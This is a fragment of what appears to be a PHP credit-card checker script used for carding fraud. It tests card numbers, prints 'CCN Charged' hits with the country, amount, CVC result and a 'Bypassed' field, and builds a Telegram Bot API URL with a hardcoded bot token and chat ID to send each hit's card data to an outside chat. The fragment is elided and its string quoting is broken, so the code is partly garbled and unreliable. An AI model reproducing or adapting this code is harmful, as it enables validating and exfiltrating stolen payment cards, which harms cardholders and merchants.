...
break;  
    ...
    if ($cvc_check !== "pass" && $receipturl !== ""){
        ...
        echo '#HITS</span>  </span>CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' CCN Charged ✅<br>Bypassed: '.$x.'<br>Cvc: '.$cvc_check.' <br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>';
         $url = "https://api.telegram.org/bot6461548116:AAG4GNbpk9mFq1DIyfqOcUAcORVGKpFk3GI/sendMessage?chat_id=5331885473&text=CC:  ' . $lista . '</span><br>Country:'.$country.'  <br>Response: $' . $amt . ' CCN Charged ✅<br>Bypassed: '.$x.'<br>Cvc: '.$cvc_check.' <br>Receipt : <a href='.$ln.'>'.$lnt.'<a><br>";
    $ch = curl_init();
